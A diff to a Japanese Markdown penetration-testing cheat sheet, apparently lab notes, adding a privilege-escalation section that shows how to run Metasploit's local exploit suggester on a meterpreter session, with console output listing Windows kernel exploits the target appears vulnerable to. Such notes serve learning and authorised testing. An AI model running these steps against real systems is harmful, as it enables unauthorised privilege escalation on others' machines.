@@ -25,6 +25,38 @@
 - ペイロードの列挙: `msfvenom -l payloads`
 
 
+## Privesc
+### local exploit suggester
+- meterpreter shell をバックグラウンドに移し、```use post/multi/recon/local_exploit_suggester``` する
+- sesionオプションを指定し、run 
+  ```msf6 exploit(windows/iis/iis_webdav_upload_asp) > use post/multi/recon/local_exploit_suggester
+  msf6 post(multi/recon/local_exploit_suggester) > options
+
+  Module options (post/multi/recon/local_exploit_suggester):
+
+     Name             Current Setting  Required  Description
+     ----             ---------------  --------  -----------
+     SESSION                           yes       The session to run this module on
+     SHOWDESCRIPTION  false            yes       Displays a detailed description for the available e
+                                                 xploits
+
+  msf6 post(multi/recon/local_exploit_suggester) > set session 3
+  session => 3
+  msf6 post(multi/recon/local_exploit_suggester) > run
+
+  [*] 10.10.10.15 - Collecting local exploits for x86/windows...
+  [*] 10.10.10.15 - 37 exploit checks are being tried...
+  [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+  [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+  [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+  [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+  [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+  [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+  [*] Post module execution completed
+  ```
+
+
+
 ## Reverse shells
 
 ### SimpleHTTPserver
